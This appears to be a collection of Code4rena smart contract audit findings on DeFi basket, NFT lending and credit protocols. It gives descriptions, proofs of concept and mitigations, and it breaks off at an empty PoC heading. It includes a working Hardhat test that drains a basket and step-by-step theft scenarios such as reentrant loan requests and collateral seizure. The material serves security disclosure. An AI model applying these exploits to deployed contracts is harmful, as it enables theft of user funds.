The extra minting of fee tokens comes on the expense of the regular basket token owners, which upon withdrawal would get less underlying than their true share, due to the dilution of their tokens' value.

### Proof of Concept

Scenario:

*   All basket token holders are burning their tokens. The last burn would set totalSupply to 0.
*   After 1 day, somebody mints basket tokens.

`handleFees` would be called upon mint, and would just return since totalSupply == 0. Note: It does not update `lastFee`.

    } else if (startSupply == 0) {
                return;

[Basket.sol#L136:#L137](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L136:#L137)

*   The next block, somebody else mints a token. Now `handleFees` will be called and will calculate the fees according to the current supply and the time diff between now and `lastFee`:

<!---->

    uint256 timeDiff = (block.timestamp - lastFee);

[Basket.sol#L139](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L139)<br>
But as we saw, `lastFee` wasn't updated in the previous step. `lastFee` is still the time of 1 day before - when the last person burned his tokens and the basket supply was 0.
So now the basket will mint fees as if a whole day has passed since the last calculation, but actually it only needs to calculate the fees for the last block, since only then we had tokens in the basket.

### Recommended Mitigation Steps

Set `lastFee = block.timestamp` if `startSupply == 0`.






***"
65.md,Missing cap on `LicenseFee`,medium,"There is no cap on `LicenseFee`. While change of `LicenseFee` is under 1 day timelock, introducing a\
`maxLicenseFee` can improve credibility by removing the ""rug"" vector. There is a `minLicenseFee` in the contracts, while imo make little sense to have `minLicenseFee` but not `maxLicenseFee`.

An incorrectly set `LicenseFee` can potentially lead to over/underflow in [Basket.sol#L140-141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L140-141) which is used in most of the function.

### Proof of Concept

[Basket.sol#L177](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L177)<br>
[Factory.sol#L77](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Factory.sol#L77)<br>
[Basket.sol#L49](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L49)

### Recommended Mitigation Steps

Define a `maxLicenseFee`





***"
65.md,Publisher can lock all user funds in the `Basket` in order to force a user to have their bond burned,medium,"All user funds in a basket being held hostage by the publisher

### Proof of Concept

The `Basket` publisher can propose an auction in order to set new tokens and weights with a 1 day timelock.

[Basket.sol#L216-L244](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L216-L244)<br>

As part of this call they can set the `minIbRatio` variable which determines what the maximum slippage on the auction is allowed to be. If it's set to the current `IbRatio` then the Basket accepts no slippage.

The publisher can choose to set `minIbRatio = type(uint256).max` which will prevent any auction bids from being successful, locking the basket in the auction state.

It's not possible to enter or exit the basket while an auction is going on, so any users who hold any funds in the basket are forced to take the only option to kill the auction available to them.

[Basket.sol#L91-L119](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L91-L119)<br>

If a user makes a bond and then waits a day to then call `Auction.bondBurn`, it will reset the auction and allow users to withdraw but it requires 0.25% of the supply of the basket token to be burned.

[Auction.sol#L121-L134](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L121-L134)<br>

One of the basket's users is then forced to give up some of their assets to secure the release of the remaining assets in the basket (for a 24hr period until the publisher starts a new auction).

This attack can be launched at any time with only 24 hours warning. This is a very short amount of time which near guarantees that if other users hold funds in the basket that not all of them will successfully withdraw in that time and so will have funds locked.

### Recommended Mitigation Steps

Again this is tricky to mitigate as there are legitimate scenarios where we would expect the `ibRatio` to increase. e.g. a basket containing WBTC being changed to contain USDC as each basket token should be worth much more USDC than it was in terms of WBTC.

To be frank the entire auction mechanism is a bit shaky as it doesn't account for changes in the values of the tokens over time.






***"
65.md,`Basket.sol#auctionBurn` calculates `ibRatio` wrong,medium,"The function is implemented as follows:

    function auctionBurn(uint256 amount) onlyAuction nonReentrant external override {
            uint256 startSupply = totalSupply();
            handleFees(startSupply);
            _burn(msg.sender, amount);

            uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);
            ibRatio = newIbRatio;

            emit NewIBRatio(newIbRatio);
            emit Burned(msg.sender, amount);
        }

When `handleFees` is called, `totalSupply` and `ibRatio` changes accordingly, but for `newIbRatio` calculation tokens minted in `handleFees` is not included. Therefore, `ibRatio` is calculated higher than it should be. This is dangerous, since last withdrawing user(s) lose their funds with this operation. In case this miscalculation happens more than once, `newIbRatio` will increase the miscalculation even faster and can result in serious amount of funds missing. At each time `auctionBurn` is called, at least 1 day (auction duration) of fees result in this miscalculation. Furthermore, all critical logic of this contract is based on `ibRatio`, this behaviour can create serious miscalculations.

### Mitigation step

Rather than

`uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);`

A practical solution to this problem is calculating `newIbRatio` as follows:

    uint256 supply = totalSupply();
    uint256 newIbRatio = ibRatio * (supply + amount) / supply;






***"
65.md,Reentrancy vulnerability in `Basket` contract's `initialize()` method.,medium,"A malicious ""publisher"" can create a basket proposal that mixes real ERC20 tokens with a malicious ERC20 token containing a reentrancy callback in it's `approve()` method. When the `initialize()` method is called on the newly cloned `Basket` contract, a method called `approveUnderlying(address(auction))` is called, which would trigger the reentrancy, call `initialize()` again, passing in altered critical values such as `auction` and `factory`, and then removes its self from `proposal.tokens` and `proposal.weights` so it doesn't appear in the token list to basket users.

[Basket.sol#L44-L61](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L44-L61)

### Impact

`Auction` and `Factory` can be set to custom implementations that do malicious things. Since all baskets and auctions are clones with their own addresses, this fact would be difficult for users to detect. `Auction` controls ibRatio, which a malicious version could send back a manipulated value to `Basket`, allowing the malicious ""publisher"" to burn basket tokens till all users underlying tokens are drained.

### Tools Used

Manual review and Hardhat.

### Recommended Mitigation Steps

Since `Basket` inherits from `ERC20Upgradeable` the `initializer` modifier should be available and therefore used here. It has an `inititializing` variable that would prevent this kind of reentrancy attack.






***"
65.md,Change in `auctionMultiplier/auctionDecrement` change profitability of auctions and factory can steal all tokens from a basket abusing it,medium,"When factory changes `auctionMultiplier` or `auctionDecrement` profitability of bonded auctions change. There is no protection against this behaviour. Furthermore, factory owners can decide to get all tokens from baskets where they are bonded for the auction.

### Proof of concept

1- Factory owners call `bondForRebalance` for an auction.

2- Factory owners sets `auctionMultiplier` as 0 and `auctionDecrement` as maximum value

3- `settleAuction` is called. `newRatio = 0`, since `a = b = 0`. All tokens can be withdrawn with this call, since `tokensNeeded = 0`.

### Extra notes

Furthermore, even the factory owners does not try to scam users. In case `auctionMultiplier` or `auctionDecrement` is changed, all current `auctionBonder` from `Auctions` can only call `settleAuction` with different constraints. Because of different constraints, users/bonder will lose/gain funds.

### Mitigation step

Save `auctionDecrement` and `auctionMultiplier` to global variables in `Auction.sol`, when `startAuction` is called.


 > This rug-pull is made even more difficult by the fact that `newRatio` must be `>= minIbRatio`. Because `minIbRatio` is behind timelock, I think this rug vector is unlikely or at least can only be used to steal a fixed amount of funds.



***"
65.md,Basket can be fully drained if the auction is settled within a specific block,medium,"The `settleAuction()` function allows someone to settle the auction by transferring funds in a way that the new pending index is fulfilled. As a reward, they are able to take out as many tokens as they want as long as the pending index is fulfilled after that. The function verifies that the basket has received everything it wanted using the following logic:

```solidity
  for (uint256 i = 0; i < pendingWeights.length; i++) {
      uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;
      require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);
  }
```

The attack vector here is to manipulate `tokensNeeded` to be 0. That way we can drain the basket completely without the function reverting.

For that, we manipulate `newRatio` to be 0 then the whole thing will be 0.
`newRatio` is defined as:

```solidity
  uint256 a = factory.auctionMultiplier() * basket.ibRatio();
  uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();
  uint256 newRatio = a - b;
```

There's 1 value the attacker controls, `bondBlock`. That value is the block in which the `bondForRebalance()` function was triggered.
So the goal is to get `newRatio` to be 0. With the base settings of the contract:

*   auctionMultiplier == 2
*   ibRatio == 1e18
*   BASE == 1e18
*   auctionDecrement == 10000

`bondBlock` has to be `auctionStart + 20000`. Meaning, the `bondForRebalance()` function has to be triggered exactly 20000 blocks after the action was started. That would be around 3 1/2 days after auction start.

At that point, `newRatio` is 0, and thus `tokensNeeded` is 0. The only thing left to do is to call `settleAuction()` and pass the basket's tokens and balance as the output tokens and weight.

### Proof of Concept

Here's a test implementing the above scenario as a test. You can add it to `Auction.test.js`.:

```js
      it.only(""should allow me to steal funds"", async() => {
        // start an auction
        let NEW_UNI_WEIGHT = ""2400000000000000000"";
        let NEW_COMP_WEIGHT = ""2000000000000000000"";
        let NEW_AAVE_WEIGHT = ""400000000000000000"";

        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
            [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;
        await increaseTime(60 * 60 * 24)
        await increaseTime(60 * 60 * 24)
        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
          [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;

        let auctionAddr = await basket.auction();
        let auction = AuctionImpl.attach(auctionAddr);

        ethers.provider.getBlockNumber();
        // increase the block number for `bondBlock - auctionStart` to be 20000.
        // When that's the case, the result of `newRatio` in `settleAuction()` 
        // is `0`. And that means `tokensNeeded` is 0. Which means,
        // we can take out all the tokens we want using the `outputTokens` array
        // without having to worry about basket's balance at the end.
        // The math changes depending on the settings of the factory contract or the
        // Basket contract. But, the gist is that you try to get newRatio to be 0.
        // The only values you can control as a attacker is the bondBlock after the auction
        // was started.
        for (let i = 0; i < 20000; i++) {
          await hre.network.provider.send(""evm_mine"")
        }
        await basket.approve(auction.address, '5000000000000000');
        await expect(auction.bondForRebalance()).to.be.ok;
        await expect(auction.settleAuction([], [], [], [UNI.address, AAVE.address], [""200720000000000000"", ""200120000000000000""])).to.be.ok;
      });
```

Again, this test uses the base values. The math changes when the settings change. But, it should always be possible to trigger this attack. The gap between auction start and bonding just changes.

### Recommended Mitigation Steps

*   Verify that `newRatio != 0`





***"
65.md,"`Auction.sol#settleAuction()` Bonder may not be able to settle a bonded auction, leading to loss of funds",medium,"[Auction.sol#L97-L102](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L97-L102)

```solidity
    uint256 a = factory.auctionMultiplier() * basket.ibRatio();
    uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();
    uint256 newRatio = a - b;

    (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();
    require(newRatio >= minIbRatio);
```

In the current implementation, `newRatio` is calculated and compared with `minIbRatio` in `settleAuction()`.

However, if `newRatio` is less than `minIbRatio`, `settleAuction()` will always fail and there is no way for the bonder to cancel and get a refund.

### Proof of Concept

Given:

*   `bondPercentDiv` = 400
*   `basketToken.totalSupply` = 40,000
*   `factory.auctionMultiplier` = 2
*   `factory.auctionDecrement` = 10,000
*   `basket.ibRatio` = 1e18
*   p`endingWeights.minIbRatio` = 1.9 \* 1e18

1.  Alice called `bondForRebalance()` `2,000` blocks after the auction started, paid `100` basketToken for the bond;
2.  Alice tries to `settleAuction()`, it will always fail because `newRatio < minIbRatio`;

*   a = 2 \* 1e18
*   b = 0.2 \* 1e18
*   newRatio = 1.8 \* 1e18;

3.  Bob calls `bondBurn()` one day after, `100` basketToken from Alice will been burned.

### Recommended Mitigation Steps

Move the `minIbRatio` check to `bondForRebalance()`:

```solidity
function bondForRebalance() public override {
    require(auctionOngoing);
    require(!hasBonded);

    bondTimestamp = block.timestamp;
    bondBlock = block.number;

    uint256 a = factory.auctionMultiplier() * basket.ibRatio();
    uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();
    uint256 newRatio = a - b;

    (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();
    require(newRatio >= minIbRatio);

    IERC20 basketToken = IERC20(address(basket));
    bondAmount = basketToken.totalSupply() / factory.bondPercentDiv();
    basketToken.safeTransferFrom(msg.sender, address(this), bondAmount);
    hasBonded = true;
    auctionBonder = msg.sender;

    emit Bonded(msg.sender, bondAmount);
}
```






***"
65.md,Lost fees due to precision loss in fees calculation,medium,"In fees calculation, division is being used in the midst of the calculation, not at the end of it.
This leads to lost precision in fee amount (as solidity doesn't save remainder of division).
Division should happen at the end to maintain precision.

### Impact

Lost fees.
The exact amount depends on the parameters set and being tested.
According to a few tests I ran, it seems that in normal usage, 1% of fees are lost.
In some cases even 7.5% of fees.

### Proof of Concept

Division in the midst of a calculation:
```solidity
uint256 feePct = timeDiff * licenseFee / ONE_YEAR;
uint256 fee = startSupply * feePct / (BASE - feePct);

_mint(publisher, fee * (BASE - factory.ownerSplit()) / BASE);
_mint(Ownable(address(factory)).owner(), fee * factory.ownerSplit() / BASE);
```

[Basket.sol#L140:#L145](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L140:#L145)<br>
It's a little hard to share a POC script as it involves changing the .sol file so I tested it manually. But after moving the division to the end using the mitigation below, I saw 1%-7% increases in fees minted. Usually 1%.

### Recommended Mitigation Steps

We want to firstly do all multiplication and lastly do all the division.
So remove the usage of feePct and instead set fee to be:
```solidity
uint256 fee = startSupply * licenseFee * timeDiff / ONE_YEAR / (BASE - licenseFee);
```






***"
65.md,`Basket:handleFees` fee calculation is wrong,medium,"The fee calculation on L141 is wrong. It should only get divided by BASE and not (BASE - feePct)

### Proof of Concept

This shows dividing only by BASE is correct:<br>
Assumptions:

*   BASE is 1e18 accordign to the code
*   timeDiff is exactly ONE_YEAR (for easier calculations)
*   startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)
*   licenseFee is 1e15 (0.1%)

If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%),

uint256 timeDiff = ONE_YEAR;<br>
uint256 feePct = timeDiff \* licenseFee / ONE_YEAR;<br>
\=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions<br>
uint256 fee = startSupply \* feePct / BASE; // only divide by BASE<br>
\=> insert values => fee = 1e18 \* licenseFee  / 1e18 = licenseFee

This shows the math is wrong:

Assumptions:

*   BASE is 1e18 according to the code
*   timeDiff is exactly ONE_YEAR (for easier calculations)
*   startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)
*   licenseFee is 1e15 (0.1%)

If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%), but the fee is bigger than that.

uint256 timeDiff = ONE_YEAR;<br>
uint256 feePct = timeDiff \* licenseFee / ONE_YEAR;<br>
\=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions

uint256 fee = startSupply \* feePct / (BASE - feePct);<br>
insert the values => fee = 1e18 \* 1e15 / (1e18 - 1e15) => (factor out 1e15) => fee = 1e15 \* 1e18 / (1e15 \* ( 1e3 - 1) => (cancel 1e15) => 1e18 / ( 1e3 - 1)

math: if we increase the divisor but the dividend stays the same we get a smaller number e.g. (1 / (2-1)) is bigger than (1 / 2)<br>
apply this here => 1e18 / ( 1e3 - 1) > 1e18 / 1e3 => 1e18 / ( 1e3 - 1) > 1e15  this shows that the fee is higher than 1e15

[Basket.sol#L133](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133)<br>
[Basket.sol#L141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141)

### Recommended Mitigation Steps

Only divide by BASE.






***"
65.md,Fee calculation is slightly off,medium,"The fee calculation
```solidity
uint256 timeDiff = (block.timestamp - lastFee);
uint256 feePct = timeDiff * licenseFee / ONE_YEAR;
uint256 fee = startSupply * feePct / (BASE - feePct);
```
tries to calculate a fee such that fee/(supply+fee) = %fee using a simple interest formula (i.e. no compounding), this lead to slightly less fee collected when fee are collected more frequently (small timeDiff) vs less frequently (big timeDiff).

### Proof of Concept

[Basket.sol#L133](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133)





***"
65.md,`Basket:handleFees():` fees are overcharged,medium,"The fee calculation is based on the totalSupply of the basket token. But some amount of the totalSupply represents the fees paid to the publisher/ protocol owner. Therefore the fees are ""overcharged"":  because the fee amount is calculated on a part of already ""paid"" fees, should only take into account what is ""owned""
by the users and not the publisher/protocol owner.

### Proof of Concept

L141: the fee percent is multiplied by startSupply (=basket token total supply)<br>
L144 & L145: publisher / protocol owner receive basket tokens as fees payment<br>
[Basket.sol#L141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141)

### Recommended Mitigation Steps

*   account the fee amount in a storage variable: uint256 feeAmount;
*   subtract feeAmount from startSupply L141: uint256 fee = (startSupply - feeAmount) \* feePct / (BASE - feePct); // note the other bug about only dividing by BASE
*   add the fee to feeAmount after the calculation:  feeAmount += fee;
*   if publisher/protocol owner burn basket token, reduce the feeAmount etc.







***"
113.md,Avoidance of Liquidation Via Malicious Oracle,high,"Issue: Arbitrary oracles are permitted on construction of loans, and there is no check that the lender agrees to the used oracle.

Consequences: A borrower who requests a loan with a malicious oracle can avoid legitimate liquidation.

### Proof of Concept

*   Borrower requests loan with an malicious oracle
*   Lender accepts loan unknowingly
*   Borrowers's bad oracle is set to never return a liquidating rate on `oracle.get` call.
*   Lender cannot call `removeCollateral` to liquidate the NFT when it should be allowed, as it will fail the check on [L288](https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L288)
*   To liquidate the NFT, the lender would have to whitehat along the lines of H-01, by atomically updating to an honest oracle and calling `removeCollateral`.

### Mitigations

*   Add `require(params.oracle == accepted.oracle)` as a condition in `_lend`
*   Consider only allowing whitelisted oracles, to avoid injection of malicious oracles at the initial loan request stage




***"
113.md,The return value `success` of the get function of the INFTOracle interface is not checked,high,"function get(address pair, uint256 tokenId) external returns (bool success, uint256 rate);

The get function of the INFTOracle interface returns two values, but the success value is not checked when used in the NFTPairWithOracle contract. When success is false, NFTOracle may return stale data.

### Proof of Concept

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/interfaces/INFTOracle.sol#L10-L10> 

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L287-L287>

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L321-L321>

### Recommended Mitigation Steps

    (bool success, uint256 rate) = loanParams.oracle.get(address(this), tokenId);
    require(success);





***"
113.md,Critical Oracle Manipulation Risk by Lender,high,"<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288>

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211>

The intended use of the Oracle is to protect the lender from a drop in the borrower's collateral value. If the collateral value goes up significantly and higher than borrowed amount + interest, the lender should not be able to seize the collateral at the expense of the borrower. However, in the `NFTPairWithOracle` contract, the lender could change the Oracle once a loan is outstanding, and therefore seize the collateral at the expense of the borrower, if the actual value of the collateral has increased significantly. This is a critical risk because borrowers asset could be lost to malicious lenders.

### Proof of Concept

In `NFTPairWithOracle`, the `params` are set by the `borrower` when they call `requestLoan()`, including the Oracle used. Once a lender agrees with the parameters and calls the `lend()` function, the `loan.status` changes to `LOAN_OUTSTANDING`.

Then, the lender can call the `updateLoanParams()` function and pass in its own `params` including the Oracle used. The `require` statement from line 205 to 211 does not check if `params.oracle` and `cur.oracle` are the same. A malicious lender could pass in his own `oracle` after the loan becomes outstanding, and the change would be reflected in line 221.

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211>

In a situation where the actual value of the collateral has gone up by a lot, exceeding the amount the lender is owed (principal + interest), the lender would have an incentive to seize the collateral. If the Oracle is not tampered with, lender should not be able to do this, because line 288 should fail. But a lender could freely change Oracle once the loan is outstanding, then a tampered Oracle could produce a very low `rate` in line 287 such that line 288 would pass, allowing the lender to seize the collateral, hurting the borrower.

<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288>

### Recommended Mitigation Steps

Once a loan is agreed to, the oracle used should not change. I'd recommend adding a check in the `require` statement in line 205 - 211 that `params.oracle == cur.oracle`




***"
113.md,Lender is able to seize the collateral by changing the loan parameters,high,"<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L198-L223>

<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L200-L212>

<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288>

The lender should only be able to seize the collateral if:

*   the borrower didn't repay in time
*   the collateral loses too much of its value

But, the lender is able to seize the collateral at any time by modifying the loan parameters.

### Proof of Concept

The [`updateLoanParams()`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L198-L223) allows the lender to modify the parameters of an active loan in favor of the borrower. But, by setting the `ltvBPS` value to `0` they are able to seize the collateral.

If `ltvBPS` is `0` the following require statement in `removeCollateral()` will always be true:

<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288>

`rate * 0 / BPS < amount` is always `true`.

That allows the lender to seize the collateral although its value didn't decrease nor did the time to repay the loan come.

So the required steps are:

1.  lend the funds to the borrower
2.  call `updateLoanParams()` to set the `ltvBPS` value to `0`
3.  call `removeCollateral()` to steal the collateral from the contract

### Recommended Mitigation Steps

Don't allow `updateLoanParams()` to change the `ltvBPS` value.




***"
113.md,Mistake while checking LTV to lender accepted LTV,high,"It comments in the `\_lend()` function that lender accepted conditions must be at least as good as the borrower is asking for.
The line which checks the accepted LTV (lender's LTV) against borrower asking LTV is:
`params.ltvBPS >= accepted.ltvBPS`,
This means lender should be offering a lower LTV, which must be the opposite way around.
I think this may have the potential to strand the lender, if he enters a lower LTV.
For example borrower asking LTV is 86%. However, lender enters his accepted LTV as 80%.
lend() will execute with 86% LTV and punish the lender, whereas it should revert and acknowledge the lender that his bid is not good enough.

### Proof of Concept

<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L316>

### Recommended Mitigation Steps

The condition should be changed as:
`params.ltvBPS <= accepted.ltvBPS`,




***"
113.md,Reentrancy at _requestLoan allows requesting a loan without supplying collateral,medium,"<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L218>

<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L238>

`_requestLoan` makes an external call to the collateral contract before updating the NFTPair contract state.

### Impact

If the ERC721 collateral has a afterTokenTransfer hook,
The NFTPair contract can be reentered, and a loan can be requested without the borrower supplying the collateral.
Someone can then lend for the loan while the collateral is missing from the contract.
Therefore the malicious borrower received the loan without supplying collateral - so lender's funds can be stolen.
The issue is present in both NFTPair and NFTPairWithOracle.

### Proof of Concept

Assume the NFT contract has an [afterTokenTransfer hook](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-\_afterTokenTransfer-address-address-uint256-) which calls back to the malicious borrower.
POC in short: borrower will call `requestLoan` with `skim==false`, then during the hook will reenter `requestLoan` with `skim==true`, then call `removeCollateral` to get his collateral back, then the first `requestLoan` will resume and initiate the loan, although the collateral is not in the contract any more.

POC in long: the borrower will do the following:

*   Call [`requestLoan`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L205:#L227) with skim==false.
*   `requestLoan` [will call](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L218) `collateral.transferFrom()`.
*   The collateral will be transferred to the NFTPair. Afterwards, the ERC721 contract will execute the `afterTokenTransfer` hook, and hand control back to Malbo (malicious borrower).
*   Malbo will call `requestLoan` again with `skim==true`.
*   As the first request's details have not been updated yet, the tokenId status is still LOAN_INITIAL, and the [require statement of the loan status](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L214) will pass.
*   The NFT has already been transfered to the contract, so the [require statement of token ownership](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L216) will pass.
*   `requestLoan` (the second) will continue and set the loan details and status.
*   After it finishes, still within the `afterTokenTransfer` hook, Malbo will call [`removeCollateral`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L247:#L268). His call will succeed as the loan is in status requested. So the collateral will get sent back to Malbo.
*   Now the `afterTokenTransfer` hook finishes.
*   The original `requestLoan` will resume operation at the [point](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L220:#L224) where all the loan details will be updated.
*   Therefore, the contract will mark the loan is valid, although the collateral is not in the contract anymore. A lender might then lend funds against the loan without Malbo needing to pay back.

### Recommended Mitigation Steps

Move the external call to the end of the function to conform with checks-effects-interaction pattern.





***"
45.md,`borrow` must `accrueInterest` first,high,"The `UToken.borrow` function first checks the borrowed balance and the old credit limit *before* accruing the actual interest on the market:

```solidity
// @audit this uses the old value
require(borrowBalanceView(msg.sender) + amount + fee <= maxBorrow, ""UToken: amount large than borrow size max"");

require(
    // @audit this calls uToken.calculateInterest(account) which returns old value
    uint256(_getCreditLimit(msg.sender)) >= amount + fee,
    ""UToken: The loan amount plus fee is greater than credit limit""
);

// @audit accrual only happens here
require(accrueInterest(), ""UToken: accrue interest failed"");
```

Thus the borrowed balance of the user does not include the latest interest as it uses the old global `borrowIndex` but the new `borrowIndex` is only set in `accrueInterest`.

#### Impact
In low-activity markets, it could be that the `borrowIndex` accruals (`accrueInterest` calls) happen infrequently and a long time is between them.
A borrower could borrow tokens, and borrow more tokens later at a different time without first having their latest debt accrued.
This will lead to borrowers being able to borrow more than `maxBorrow` and **more than their credit limit** as these checks are performed before updating accruing interest.

#### Recommended Mitigation Steps
The `require(accrueInterest(), ""UToken: accrue interest failed"");` call should happen at the beginning of the function."
45.md,Wrong implementation of `CreditLimitByMedian.sol#getLockedAmount()` makes it unable to unlock `lockedAmount` in `CreditLimitByMedian` model,high,"[`CreditLimitByMedian.sol` L27-L78](https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/CreditLimitByMedian.sol#L27-L78)

```solidity
function getLockedAmount(
    LockedInfo[] memory array,
    address account,
    uint256 amount,
    bool isIncrease
) public pure override returns (uint256) {
    if (array.length == 0) return 0;

    uint256 newLockedAmount;
    if (isIncrease) {
        ...
    } else {
        for (uint256 i = 0; i < array.length; i++) {
            if (array[i].lockedAmount > amount) {
                newLockedAmount = array[i].lockedAmount - 1;
            } else {
                newLockedAmount = 0;
            }

            if (account == array[i].staker) {
                return newLockedAmount;
            }
        }
    }

    return 0;
}
```

`getLockedAmount()` is used by `UserManager.sol#updateLockedData()` to update locked amounts.

Based on the context, at L66, `newLockedAmount = array[i].lockedAmount - 1;` should be `newLockedAmount = array[i].lockedAmount - amount;`.

The current implementation is wrong and makes it impossible to unlock `lockedAmount` in `CreditLimitByMedian` model.

##### Recommendation
Change to:

`newLockedAmount = array[i].lockedAmount - amount;`"
45.md,Wrong implementation of `CreditLimitByMedian.sol#getLockedAmount()` will lock a much bigger total amount of staked tokens than expected,medium,"[`CreditLimitByMedian.sol` L27-L63](https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/CreditLimitByMedian.sol#L27-L63)

```solidity
function getLockedAmount(
    LockedInfo[] memory array,
    address account,
    uint256 amount,
    bool isIncrease
) public pure override returns (uint256) {
    if (array.length == 0) return 0;

    uint256 newLockedAmount;
    if (isIncrease) {
        for (uint256 i = 0; i < array.length; i++) {
            uint256 remainingVouchingAmount;
            if (array[i].vouchingAmount > array[i].lockedAmount) {
                remainingVouchingAmount = array[i].vouchingAmount - array[i].lockedAmount;
            } else {
                remainingVouchingAmount = 0;
            }

            if (remainingVouchingAmount > array[i].availableStakingAmount) {
                if (array[i].availableStakingAmount > amount) {
                    newLockedAmount = array[i].lockedAmount + amount;
                } else {
                    newLockedAmount = array[i].lockedAmount + array[i].availableStakingAmount;
                }
            } else {
                if (remainingVouchingAmount > amount) {
                    newLockedAmount = array[i].lockedAmount + amount;
                } else {
                    newLockedAmount = array[i].lockedAmount + remainingVouchingAmount;
                }
            }

            if (account == array[i].staker) {
                return newLockedAmount;
            }
        }
    } else {
    ...
```

`getLockedAmount()` is used by `UserManager.sol#updateLockedData()` to update locked amounts.

The current implementation is wrong and locks every staker for the amount of the borrowed amount or all the `vouchingAmount` if the `vouchingAmount` is smaller than the borrowed amount in `CreditLimitByMedian` model.

##### PoC
